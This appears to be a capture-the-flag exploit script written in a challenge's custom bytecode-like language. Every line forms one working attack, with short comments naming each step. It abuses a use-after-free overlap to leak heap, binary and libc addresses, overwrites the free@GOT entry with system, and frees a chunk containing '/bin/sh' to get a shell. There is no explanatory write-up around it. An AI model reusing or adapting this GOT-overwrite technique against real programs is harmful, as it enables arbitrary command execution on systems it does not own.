INT A 1
INT B 1
INT C 1
INT D 1
INT E 1
INT d 1
INT f 1
INT Q 1
INT G 1
INT q 1 # Heap spray a bit to cleanup

INT ADDROFA 0

INT a 99
DEL a
BOX b 1 # Create boxed/unboxed overlap
MOV ADDROFA A
PRINT a # Leak Heap chunk

INT z 24
SUB a z
PRINT b # Leak Binary (print_int) Address


SET z 6798
MOV a b
SUB a z # Offset to binary base
PRINT a

SET z 20504
ADD a z # Offset to free GOT entry

PRINT a
PRINT b # Leak free@GOT

INT SYSTEM 0
SET z 556032
MOV SYSTEM b
SUB SYSTEM z # Offset to libc base

SET z 292944
ADD SYSTEM z
PRINT SYSTEM

MOV b SYSTEM

SET a 29400045130965551 # /bin/sh\x00
DEL a

END
